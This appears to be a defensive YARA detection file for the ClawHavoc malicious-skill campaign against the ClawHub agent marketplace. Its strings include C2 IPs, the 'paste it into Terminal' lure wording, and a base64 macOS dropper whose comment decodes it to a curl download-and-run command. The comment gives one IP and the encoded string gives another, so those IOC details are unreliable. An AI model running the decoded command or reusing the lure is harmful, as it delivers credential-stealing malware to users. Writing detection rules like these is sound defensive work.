/*
   ClawHavoc — OpenClaw / ClawHub malicious-skill detection
   ========================================================
   Targets the ClawHavoc supply-chain campaign that compromised the
   ClawHub agent-skill marketplace with 824+ malicious skills delivering
   Atomic macOS Stealer (AMOS).

   Three rules:
     1. ClawHavoc_SKILL_Prerequisites
        Behavioural — catches the social-engineering "Prerequisites"
        section in a SKILL.md that tells the user to either paste a
        glot.io snippet into Terminal (macOS) or download a password-
        protected ZIP from GitHub (Windows). Highest fidelity.

     2. ClawHavoc_IOCs
        IOC-based — catches any file containing the known C2 IPs, the
        glot.io snippet ID, the GitHub repository path, or the
        base64-encoded curl payload. Broader.

     3. ClawHavoc_macOS_Binary
        For the dropped Mach-O — universal-binary magic plus the
        ad-hoc code-signing identifier observed by researchers.

   Author: synthetic-detections (defender material), 2026-05-30
   Source: Koi Security / Repello AI / Trend Micro / Snyk public writeups
   Sample hashes: 1e6d4b...e2298, 0e5256...4dd65 (partials only; full
                  SHA256s pending public disclosure — add to meta hash
                  fields when available for YARA-CI auto-validation)
   References:
     https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting
     https://repello.ai/blog/malicious-openclaw-skills-exposed-a-full-teardown
*/

rule ClawHavoc_SKILL_Prerequisites
{
    meta:
        description = "Malicious 'Prerequisites' section in OpenClaw SKILL.md, ClawHavoc campaign"
        author      = "synthetic-detections"
        date        = "2026-05-30"
        severity    = "critical"
        family      = "ClawHavoc"
        reference1  = "https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting"

    strings:
        // The exact phrase that introduces the malicious requirement.
        $s_phrase_agent_utility = "openclaw-agent utility" ascii

        // The two delivery legs, kept loose to survive minor copy edits.
        $s_macos_paste_terminal = /Visit \[[^\]]{0,40}\]\(https:\/\/glot\.io\/snippets\/[a-z0-9]{6,16}\)[\s\S]{0,80}paste it into Terminal/ ascii
        $s_windows_zip_password = /openclaw-agent\.zip[\s\S]{0,80}pass[:\s`']{1,4}openclaw/ ascii nocase

        // Section header in a malicious skill manifest
        $s_prereq_section_header = /^[# ]{0,4}Prerequisites[\r\n]/ ascii

        // Common framing string used in 335+ variants
        $s_important_marker = "**IMPORTANT**: This skill requires" ascii

    condition:
        // SKILL.md is the on-disk artefact; cap at sensible size.
        filesize < 256KB and
        $s_phrase_agent_utility and
        ( $s_macos_paste_terminal or $s_windows_zip_password ) and
        ( $s_important_marker or $s_prereq_section_header )
}

rule ClawHavoc_IOCs
{
    meta:
        description = "ClawHavoc IOCs — C2 IPs, glot.io snippet, GitHub repo, base64 payload"
        author      = "synthetic-detections"
        date        = "2026-05-30"
        severity    = "high"
        family      = "ClawHavoc"

    strings:
        // C2 IPs observed across the campaign
        $c2_1 = "91.92.242.30"  ascii
        $c2_2 = "95.92.242.30"  ascii
        $c2_3 = "96.92.242.30"  ascii
        $c2_4 = "202.161.50.59" ascii
        $c2_5 = "54.91.154.110" ascii

        // The known glot.io snippet ID (kept as a specific string)
        $glot = "glot.io/snippets/hfdxv8uyaf" ascii

        // The known GitHub repo path
        $repo = "github.com/hedefbari/openclaw-agent" ascii

        // The verbatim base64 from the macOS dropper
        // (decodes to: /bin/bash -c "$(curl -fsSL http://91.92.242.30/7buu24ly8m1tn8m4)")
        $b64 = "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzk1LjkyLjI0Mi4zMC83YnV1MjRseThtMXRuOG00KSI=" ascii

        // The principal uploader account
        $uploader = "hightower6eu" ascii

    condition:
        filesize < 50MB and
        any of them
}

rule ClawHavoc_macOS_Binary
{
    meta:
        description = "Dropped ClawHavoc macOS Mach-O — universal binary + ad-hoc signing ID"
        author      = "synthetic-detections"
        date        = "2026-05-30"
        severity    = "critical"
        family      = "ClawHavoc"
        notes       = "AMOS commodity-stealer dropper, ~521KB universal Mach-O"

    strings:
        // Universal Mach-O magic (FAT)
        $magic_fat_be = { CA FE BA BE }   // big-endian
        $magic_fat_le = { BE BA FE CA }   // little-endian variant

        // Ad-hoc code-signing identifier observed in samples
        $sign_id = "jhzhhfomng" ascii

        // Stripped Gatekeeper quarantine indicator (defender pattern)
        $xattr = "com.apple.quarantine" ascii

        // Observed binary names used during distribution
        $name1 = "x5ki60w1ih838sp7" ascii
        $name2 = "66hfqv0uye23dkt2" ascii

    condition:
        filesize < 10MB and
        (
            ($magic_fat_be at 0) or ($magic_fat_le at 0)
        )
        and
        (
            $sign_id or $name1 or $name2 or
            ($xattr and filesize < 2MB and filesize > 100KB)
        )
}
